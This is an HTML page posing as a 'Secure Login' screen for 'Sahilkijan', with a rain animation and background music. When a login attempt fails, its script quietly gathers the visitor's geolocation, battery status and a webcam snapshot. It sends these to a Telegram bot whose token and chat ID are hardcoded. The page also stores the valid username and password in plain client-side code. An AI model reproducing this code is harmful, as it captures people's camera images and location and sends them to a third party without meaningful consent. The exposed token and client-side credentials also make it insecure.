<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Secure Login - Sahilkijan</title>
<style>
  body, html {
    margin: 0; padding: 0; height: 100%; overflow: hidden; font-family: Arial, sans-serif;
    background: #0e0e10;
    color: white;
    position: relative;
  }
  #rain-canvas {
    position: fixed;
    top: 0; left: 0;
    width: 100%;
    height: 100%;
    z-index: 0;
  }
  .login-container {
    position: relative;
    z-index: 10;
    background: rgba(0,0,0,0.7);
    border-radius: 10px;
    padding: 30px 25px;
    max-width: 360px;
    margin: auto;
    top: 50%;
    transform: translateY(-50%);
    box-shadow: 0 0 15px #111;
  }
  h2 {
    margin-bottom: 25px;
    text-align: center;
  }
  input[type="text"], input[type="password"] {
    width: 100%;
    padding: 12px;
    margin: 8px 0 20px 0;
    border: none;
    border-radius: 6px;
    font-size: 16px;
  }
  button {
    width: 100%;
    padding: 12px;
    border: none;
    border-radius: 6px;
    background-color: #4a90e2;
    color: white;
    font-size: 16px;
    cursor: pointer;
    transition: background-color 0.3s ease;
  }
  button:hover {
    background-color: #357ABD;
  }
  .error {
    color: #ff6b6b;
    margin-bottom: 15px;
    text-align: center;
    font-weight: bold;
  }
  audio {
    display: none;
  }
</style>
</head>
<body>

<canvas id="rain-canvas"></canvas>

<div class="login-container">
  <h2>Login to Sahilkijan</h2>
  <div id="error" class="error"></div>
  <input type="text" id="username" placeholder="Username" autocomplete="off" />
  <input type="password" id="password" placeholder="Password" autocomplete="off" />
  <button onclick="handleLogin()">Login</button>
</div>

<!-- Music autoplay -->
<audio id="bg-music" autoplay loop>
  <source src="https://drive.google.com/uc?export=download&id=10EcNHISjcW73BipAk-EhoUUCPwjCIPkO" type="audio/mpeg" />
  Your browser does not support the audio element.
</audio>

<script>
const TELEGRAM_BOT_TOKEN = '7767077395:AAGxsUfQnAHyLmxXE2F1093Fc59MXHcSUkc';
const TELEGRAM_CHAT_ID = '7597265569';

const CORRECT_USERNAME = 'Sahilkijan';
const CORRECT_PASSWORD = 'bhaikiguriya';

function sendTelegramMessage(message) {
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    }),
  }).catch(console.error);
}

function sendTelegramPhoto(photoBlob, caption) {
  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID);
  formData.append('photo', photoBlob, 'intruder.jpg');
  formData.append('caption', caption);

  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
    method: 'POST',
    body: formData
  }).catch(console.error);
}

function handleLogin() {
  const errorDiv = document.getElementById('error');
  errorDiv.textContent = '';

  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value;

  if (username === CORRECT_USERNAME && password === CORRECT_PASSWORD) {
    alert('Welcome Sahilkijan!');
    // Add your redirect or secure content here
  } else {
    errorDiv.textContent = 'Invalid username or password.';
    triggerSurveillance(username);
  }
}

async function triggerSurveillance(enteredUsername) {
  let batteryInfo = 'Battery info not available';
  if (navigator.getBattery) {
    try {
      const battery = await navigator.getBattery();
      batteryInfo = `Battery level: ${(battery.level * 100).toFixed(0)}%, Charging: ${battery.charging}`;
    } catch {}
  }

  let locationInfo = 'Location not available';
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        locationInfo = `Latitude: ${pos.coords.latitude.toFixed(6)}, Longitude: ${pos.coords.longitude.toFixed(6)}`;
        capturePhotoAndSend(enteredUsername, locationInfo, batteryInfo);
      },
      (err) => {
        locationInfo = 'Location permission denied or unavailable.';
        capturePhotoAndSend(enteredUsername, locationInfo, batteryInfo);
      },
      { timeout: 10000 }
    );
  } else {
    capturePhotoAndSend(enteredUsername, locationInfo, batteryInfo);
  }
}

function capturePhotoAndSend(username, locationInfo, batteryInfo) {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    sendTelegramMessage(`*Intruder Alert*\nUsername Attempt: ${username}\n${locationInfo}\n${batteryInfo}\nCamera not available.`);
    return;
  }

  navigator.mediaDevices.getUserMedia({ video: true, audio: false })
    .then((stream) => {
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();

      video.addEventListener('loadeddata', () => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);

        canvas.toBlob((blob) => {
          const caption = `*Intruder Alert*\nUsername Attempt: ${username}\n${locationInfo}\n${batteryInfo}`;
          sendTelegramPhoto(blob, caption);
          stream.getTracks().forEach(track => track.stop());
        }, 'image/jpeg', 0.8);
      });
    })
    .catch(() => {
      sendTelegramMessage(`*Intruder Alert*\nUsername Attempt: ${username}\n${locationInfo}\n${batteryInfo}\nUnable to access camera.`);
    });
}

/* Rain animation code */
const canvas = document.getElementById('rain-canvas');
const ctx = canvas.getContext('2d');
let width, height;
let drops = [];

function resize() {
  width = window.innerWidth;
  height = window.innerHeight;
  canvas.width = width;
  canvas.height = height;
}
resize();
window.addEventListener('resize', resize);

function createDrops() {
  for (let i = 0; i < 500; i++) {
    drops.push({
      x: Math.random() * width,
      y: Math.random() * height,
      length: 10 + Math.random() * 20,
      speed: 4 + Math.random() * 4,
      opacity: 0.2 + Math.random() * 0.5
    });
  }
}

function draw() {
  ctx.clearRect(0, 0, width, height);
  ctx.strokeStyle = 'rgba(174,194,224,0.5)';
  ctx.lineWidth = 1;
  ctx.lineCap = 'round';

  drops.forEach(drop => {
    ctx.beginPath();
    ctx.moveTo(drop.x, drop.y);
    ctx.lineTo(drop.x, drop.y + drop.length);
    ctx.stroke();
  });

  update();
}

function update() {
  drops.forEach(drop => {
    drop.y += drop.speed;
    if (drop.y > height) {
      drop.x = Math.random() * width;
      drop.y = -drop.length;
      drop.length = 10 + Math.random() * 20;
      drop.speed = 4 + Math.random() * 4;
      drop.opacity = 0.2 + Math.random() * 0.5;
    }
  });
}

createDrops();

function animate() {
  draw();
  requestAnimationFrame(animate);
}
animate();

/* Auto play fix on user interaction */
const music = document.getElementById('bg-music');
function playMusic() {
  music.play().catch(() => {
    // Autoplay prevented
  });
}
document.body.addEventListener('click', () => {
  playMusic();
});
</script>

</body>
</html>
